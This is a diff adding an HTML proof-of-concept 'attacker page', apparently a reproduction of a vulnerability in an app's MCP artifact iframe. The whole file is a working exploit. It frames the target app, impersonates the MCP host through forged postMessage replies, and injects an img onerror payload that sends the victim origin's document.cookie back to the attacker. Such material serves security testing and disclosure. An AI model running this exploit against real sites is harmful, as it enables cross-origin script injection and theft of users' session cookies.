@@ -1,0 +1,32 @@
+<!doctype html>
+<!-- Attacker page on a foreign origin. Frames the app's /mcp-artifact-app.html
+     (?target=<url>), becomes its window.parent, and plays MCP host: answers
+     ui/initialize, sends a tool-result, then answers get_artifact_data with
+     artifact code that runs in whatever origin the shell lives in. -->
+<html><body style="font-family:sans-serif">
+<h3>attacker page (<span id="me"></span>)</h3>
+<iframe id="app" width="640" height="220" style="border:1px solid #c00"></iframe>
+<pre id="log">nothing stolen</pre>
+<script>
+document.getElementById('me').textContent = location.origin;
+var app = document.getElementById('app');
+app.src = new URLSearchParams(location.search).get('target');
+var CODE = '<div>forged artifact</div><img src=x onerror="document.body.dataset.pwned=location.origin;' +
+  'parent.postMessage({stolen: location.origin + \' cookie=\' + document.cookie}, \'*\')">';
+function reply(id, result) { app.contentWindow.postMessage({ jsonrpc: '2.0', id: id, result: result }, '*'); }
+window.addEventListener('message', function (e) {
+  var m = e.data;
+  if (m && m.stolen) { window.STOLEN = m.stolen; document.getElementById('log').textContent = 'STOLEN: ' + m.stolen; return; }
+  if (!m || m.jsonrpc !== '2.0' || m.id == null) return;
+  if (m.method === 'ui/initialize') {
+    reply(m.id, {});
+    setTimeout(function () {
+      app.contentWindow.postMessage({ jsonrpc: '2.0', method: 'ui/notifications/tool-result',
+        params: { content: [{ type: 'text', text: JSON.stringify({ artifact_id: 'a1' }) }] } }, '*');
+    }, 50);
+  } else if (m.method === 'tools/call') {
+    reply(m.id, { content: [{ type: 'text', text: JSON.stringify({ code: CODE, mode: 'slides', report: {}, visualizations: [] }) }] });
+  }
+});
+</script>
+</body></html>
